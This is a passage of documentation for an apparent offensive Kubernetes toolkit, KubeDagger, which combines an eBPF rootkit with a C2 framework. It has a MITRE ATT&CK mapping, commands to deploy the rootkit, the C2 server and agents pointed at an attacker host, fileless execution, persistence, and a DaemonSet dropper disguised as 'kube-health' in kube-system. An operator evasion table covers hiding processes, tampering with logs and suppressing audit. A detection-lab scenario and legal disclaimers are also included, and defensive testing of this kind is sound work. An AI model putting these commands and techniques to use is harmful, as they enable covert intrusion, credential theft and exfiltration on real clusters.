| Agent identity | Auto-generated 16-char hex ID |
| Replay protection | Nonce-based AEAD, monotonic counters |

---

## MITRE ATT&CK Coverage

KubeDagger maps to **37 MITRE ATT&CK techniques** across the kill chain:

### Initial Access
| Technique | ID | KubeDagger Feature |
|-----------|----|--------------------|
| Implant Internal Image | T1525 | docker, webhook, cri-tamper |

### Execution
| Technique | ID | KubeDagger Feature |
|-----------|----|--------------------|
| Container Orchestration Job | T1053.007 | daemonset |
| Container Administration Command | T1609 | kubelet |
| Native API | T1106 | eBPF syscall |
| Reflective Code Loading | T1620 | fileless-exec |

### Persistence
| Technique | ID | KubeDagger Feature |
|-----------|----|--------------------|
| Scheduled Task/Job: Cron | T1053.003 | persistence |
| CRD-Based Backdoor | — | crd-backdoor |

### Privilege Escalation
| Technique | ID | KubeDagger Feature |
|-----------|----|--------------------|
| Escape to Host | T1611 | container escape |
| Valid Accounts: Cloud | T1078.004 | cloud meta |

### Defense Evasion
| Technique | ID | KubeDagger Feature |
|-----------|----|--------------------|
| Rootkit | T1014 | BPF program hiding |
| Impair Defenses | T1562.001 | evasion |
| Indicator Blocking | T1562.006 | syscall-bypass |
| Clear Linux/Mac System Logs | T1070.002 | log-tamper |
| Code Signing Policy Modification | T1553.006 | sig-bypass |
| Hide Artifacts: Hidden Files | T1564.001 | file/process hiding |

### Credential Access
| Technique | ID | KubeDagger Feature |
|-----------|----|--------------------|
| OS Credential Dumping | T1003 | postgres |
| Cloud Instance Metadata API | T1552.005 | cloud meta |
| Credentials In Files | T1552.001 | secrets harvest |
| Steal Application Access Token | T1528 | secrets harvest |
| Unsecured Credentials: Private Keys | T1552.004 | etcd-steal |
| Password Managers | T1555.005 | keyring |
| Application Access Token | T1550.001 | sa-token |

### Discovery
| Technique | ID | KubeDagger Feature |
|-----------|----|--------------------|
| Network Service Scanning | T1046 | network_discovery |
| System Information Discovery | T1082 | k8s discover |

### Lateral Movement
| Technique | ID | KubeDagger Feature |
|-----------|----|--------------------|
| Network Boundary Bridging | T1599.001 | netbypass |
| Adversary-in-the-Middle | T1557 | DNS spoofing, ARP |

### Collection
| Technique | ID | KubeDagger Feature |
|-----------|----|--------------------|
| Data from Local System | T1005 | fs_watch |
| Network Sniffing | T1040 | tls-intercept |

### Command and Control
| Technique | ID | KubeDagger Feature |
|-----------|----|--------------------|
| Application Layer Protocol: Web | T1071.001 | HTTP C2 |
| Application Layer Protocol: DNS | T1071.004 | dns_exfil, doh-c2 |
| Traffic Signaling | T1205 | XDP-based C2 |
| Protocol Tunneling | T1572 | covert-channel |
| Proxy: Domain Fronting | T1090.004 | meshbypass |

### Exfiltration
| Technique | ID | KubeDagger Feature |
|-----------|----|--------------------|
| Transfer Data to Cloud Account | T1537 | cloud exfil |

### Impact
| Technique | ID | KubeDagger Feature |
|-----------|----|--------------------|
| Data Manipulation: Transmitted | T1565.002 | obs-poison |
| Compromise Software Supply Chain | T1195.002 | supply-chain |

### Generating ATT&CK Navigator Layers

```shell
# JSON format (import into ATT&CK Navigator)
kubedagger-client mitre export --format json -o navigator_layer.json

# Markdown report
kubedagger-client mitre export --format markdown -o report.md
```

Import the JSON into [ATT&CK Navigator](https://mitre-attack.github.io/attack-navigator/) to visualize your operation's technique coverage.

---

## Deployment Scenarios

### Scenario A: Lab Environment (Learning/Research)

```shell
# Single VM with eBPF support
# Recommended: Ubuntu 22.04+ with kernel 5.15+

# Build everything
make

# Start eBPF rootkit in dev mode
sudo ./bin/kubedagger -i eth0 -e eth0 --disable-bpf-obfuscation

# Start C2 server in plaintext mode (no TLS for testing)
./bin/kubedagger-server -key testkey123 -plaintext

# Start agent
./bin/kubedagger-agent-linux -server http://127.0.0.1:443 -plaintext

# Operate
./bin/kubedagger-operator -key testkey123 agents
```

### Scenario B: Authorized Red Team Engagement

```shell
# Infrastructure setup (attacker-controlled server)
# 1. Generate mTLS certificates
# 2. Deploy C2 server with TLS
./bin/kubedagger-server -key $KEY \
  -ca ca.pem -cert server.pem -key-file server-key.pem \
  -listen 0.0.0.0:443

# Target deployment (via initial access)
# Transfer agent binary + certs to target
./bin/kubedagger-agent-linux -server https://c2.operator.com:443 \
  -ca ca.pem -cert agent.pem -key agent-key.pem

# Operations (from operator workstation)
./bin/kubedagger-operator -key $KEY -addr c2.operator.com:9443 agents
```

### Scenario C: Detection Engineering Lab

```shell
# Deploy in a monitored test cluster with:
# - Falco running
# - Tetragon running
# - K8s audit logging enabled
# - SIEM collecting all logs

# Run with obfuscation DISABLED for clearer telemetry
sudo ./bin/kubedagger -i eth0 -e eth0 --disable-bpf-obfuscation

# Execute techniques one at a time, validating detection after each
kubedagger-client escape --action detect
# → Check: did Falco/Tetragon fire an alert?

kubedagger-client secrets harvest --sources k8s
# → Check: did the SIEM capture the secrets API call?
```

### Scenario D: Multi-Node Cluster Operation

```shell
# Node 1 (primary)
sudo ./bin/kubedagger -i eth0 -e eth0 --c2-port 9001 --c2-key $KEY --persist

# Node 2 (peer of node 1)
sudo ./bin/kubedagger -i eth0 -e eth0 --c2-port 9001 --c2-key $KEY \
  --peers 10.0.2.3:9001

# Node 3 (peer of both)
sudo ./bin/kubedagger -i eth0 -e eth0 --c2-port 9001 --c2-key $KEY \
  --peers 10.0.2.3:9001,10.0.2.4:9001

# All nodes share topology data automatically
# Query merged view from any node
kubedagger-client network_discovery get --passive --all-nodes
```

---

## Operational Security Considerations

### For Red Team Operators

| Concern | Mitigation |
|---------|------------|
| C2 traffic detection | Use DoH C2, TCP window stego, or K8s Event C2 |
| Process visibility | Enable syscall-bypass to hide PIDs |
| File forensics | Use fileless-exec (memfd_create) — no disk artifacts |
| Memory forensics | Enable coredump-suppress for rootkit processes |
| Log evidence | Use log-tamper to drop incriminating entries |
| Timing analysis | Beacon jitter + timeskew for timestamp confusion |
| Signature detection | Use polymorph to mutate eBPF bytecode |
| Network capture | Enable pcap-blind to hide from tcpdump |
| Audit trail | Use audit-filter to suppress audit records |

### For Blue Team Validation

When using KubeDagger for detection testing, **intentionally disable stealth features** to generate clear telemetry:

```shell
# Start with all stealth features OFF
sudo ./bin/kubedagger -i eth0 -e eth0 \
  --disable-bpf-obfuscation \
  --disable-network-probes

# Then progressively enable stealth to test detection depth
sudo ./bin/kubedagger -i eth0 -e eth0  # default stealth ON
```

### Scope Boundaries

Always ensure:
- Written authorization (Rules of Engagement) before any testing
- Clearly defined scope (which clusters, namespaces, nodes)
- Kill switch available (ability to immediately stop all agents)
- Evidence preservation for post-engagement reporting
- Deconfliction with other security testing activities

---

## Frequently Asked Questions

### General

**Q: Is KubeDagger a real rootkit?**
A: It implements real offensive techniques for educational and authorized testing purposes. It should only be used in authorized security engagements, CTF competitions, or isolated lab environments.

**Q: What kernel versions are supported?**
A: Linux kernel 5.4+ with BTF (BPF Type Format) enabled. Most modern distributions (Ubuntu 20.04+, RHEL 8.3+, Fedora 33+) include BTF support.

**Q: Does the C2 framework require eBPF?**
A: No. The HTTP/2 C2 framework (server, agent, operator) is completely independent of eBPF and runs on Linux, Windows, and macOS without kernel dependencies.

### Deployment

**Q: How do I deploy the agent without writing to disk?**
A: Use fileless execution via the memexec module:
```shell
./kubedagger-operator -key $KEY module agent-id memexec method=memfd payload=/tmp/agent
```

**Q: How do I persist across reboots?**
A: Use the `--persist` flag which installs a systemd service or cron entry:
```shell
sudo ./bin/kubedagger -i eth0 -e eth0 --persist
```

**Q: Can I deploy cluster-wide?**
A: Yes, use the DaemonSet dropper:
```shell
kubedagger-client daemonset --action deploy --image kubedagger:latest \
  --name kube-health --namespace kube-system
```

### Detection

**Q: How do I test if my security tools can detect KubeDagger?**
A: Run with `--disable-bpf-obfuscation` and execute techniques one by one. Check your security tooling (Falco, Tetragon, SIEM) for corresponding alerts after each technique.

**Q: What are the hardest techniques to detect?**
A: Kernel-level techniques (BPF polymorphism, syscall hooking, XDP packet manipulation) are the hardest because they operate below most security tools. TCP window steganography and K8s Event C2 are extremely difficult to detect at the network level.

**Q: How do I generate a MITRE ATT&CK report?**
A:
```shell
kubedagger-client mitre export --format json -o layer.json
# Import into https://mitre-attack.github.io/attack-navigator/
```

### Troubleshooting

**Q: Agent isn't connecting to the server**
A: Check:
1. Server is reachable from agent network
2. Certificates match (same CA for mTLS)
3. Port is not blocked by firewall/network policy
4. Use `-plaintext` for development to rule out TLS issues

**Q: eBPF programs fail to load**
A: Check:
1. Running as root (or CAP_BPF + CAP_NET_ADMIN)
2. Kernel has BTF enabled (`ls /sys/kernel/btf/vmlinux`)
3. Kernel headers installed (`/lib/modules/$(uname -r)/build`)
4. BPF JIT enabled (`sysctl net.core.bpf_jit_enable`)

**Q: Container escape fails**
A: Not all containers are escapable. Check:
1. Is the container privileged? (`--privileged`)
2. Does it have hostPID/hostNetwork?
3. Is the Docker/containerd socket mounted?
4. Does it have SYS_ADMIN capability?

---

## Quick Reference: Complete Attack Lifecycle

```
┌─────────────────────────────────────────────────────────────────────┐
│                    KUBERNETES ATTACK LIFECYCLE                        │
│                                                                       │
│  ┌─────────────┐                                                     │
│  │ 1. INITIAL  │  RCE in pod, stolen kubeconfig, malicious image    │
│  │    ACCESS   │  → Deploy kubedagger-agent                          │
│  └──────┬──────┘                                                     │
│         │                                                            │
│  ┌──────▼──────┐                                                     │
│  │ 2. RECON    │  k8s_discovery, cloud_metadata, honeypot_detect    │
│  │             │  network_discovery, sa_token                        │
│  └──────┬──────┘                                                     │
│         │                                                            │
│  ┌──────▼──────┐                                                     │
│  │ 3. PRIVESC  │  escape (privileged/socket/cgroup/nsenter)          │
│  │             │  k8s abuse --action escalate                        │
│  │             │  cloud_exploit action=iam_escalate                   │
│  └──────┬──────┘                                                     │
│         │                                                            │
│  ┌──────▼──────┐                                                     │
│  │ 4. LATERAL  │  multi_cluster, kubelet API abuse                   │
│  │   MOVEMENT  │  veth-hijack, sidecar-inject                        │
│  │             │  arp-spoof, pod-identity theft                       │
│  └──────┬──────┘                                                     │
│         │                                                            │
│  ┌──────▼──────┐                                                     │
│  │ 5. PERSIST  │  daemonset, webhook, crd-backdoor                   │
│  │             │  persistence (systemd/cron), gitops-poison          │
│  │             │  cicd_poison                                         │
│  └──────┬──────┘                                                     │
│         │                                                            │
│  ┌──────▼──────┐                                                     │
│  │ 6. EVASION  │  cloud_evasion (falco/tetragon bypass)              │
│  │             │  antiforensics, polymorph, log-tamper                │
│  │             │  syscall-bypass, audit-filter, pcap-blind            │
│  └──────┬──────┘                                                     │
│         │                                                            │
│  ┌──────▼──────┐                                                     │
│  │ 7. COLLECT  │  secrets harvest, fs_watch, tls-intercept           │
│  │   & EXFIL   │  etcd-steal, keyring, cloud exfil                   │
│  │             │  dns_exfil, covert-channel, tcp-stego               │
│  └──────┬──────┘                                                     │
│         │                                                            │
│  ┌──────▼──────┐                                                     │
│  │ 8. IMPACT   │  obs-poison, sched-starve, election-disrupt         │
│  │ (optional)  │  cert-sabotage, cgroup-manip, fault-inject          │
│  └─────────────┘                                                     │
└─────────────────────────────────────────────────────────────────────┘
```

---

## Legal Notice

This tool is provided for **authorized security testing and educational purposes only**. Unauthorized use against systems you do not own or have explicit written permission to test is illegal. The authors assume no liability for misuse. Always:

1. Obtain written authorization before testing
2. Define clear scope and boundaries
3. Follow responsible disclosure practices
4. Comply with all applicable laws and regulations
5. Document all activities for post-engagement reporting
